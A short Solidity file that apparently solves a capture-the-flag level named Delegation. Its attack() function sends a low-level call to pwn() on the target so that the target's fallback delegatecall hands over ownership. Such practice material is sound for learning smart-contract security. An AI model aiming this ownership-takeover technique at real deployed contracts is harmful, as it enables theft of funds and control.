// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Delegation.sol";

contract Solve {
    function attack(address _address) public {
        Delegation target = Delegation(_address);
        address(target).call(abi.encodeWithSignature("pwn()"));
    }
}